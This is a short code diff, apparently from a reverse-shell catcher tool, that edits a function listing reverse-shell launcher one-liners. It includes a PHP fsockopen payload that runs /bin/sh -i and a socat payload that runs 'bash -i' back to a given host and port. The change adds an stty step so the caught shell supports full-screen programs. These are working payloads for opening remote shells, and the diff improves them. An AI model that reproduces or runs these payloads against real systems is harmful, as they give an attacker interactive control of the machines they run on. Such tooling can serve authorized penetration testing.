@@ -38,7 +38,15 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
 
     { id: 'unix-php', os: 'linux', command: `php -r '$s=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
 
-    { id: 'unix-socat', os: 'linux', command: `socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:${host}:${port}` },
+    {
+      id: 'unix-socat',
+      os: 'linux',
+      // The stty sets the pty's window size before the shell runs: a pty at
+      // the default 0x0 refuses full-screen programs (vim, top), and the
+      // catch socket carries no resize channel to fix it later.
+      command:
+        `socat exec:'stty rows 40 cols 120; bash -i',pty,stderr,setsid,sigint,sane tcp:${host}:${port}`,
+    },
 
     {
       id: 'windows-powershell',
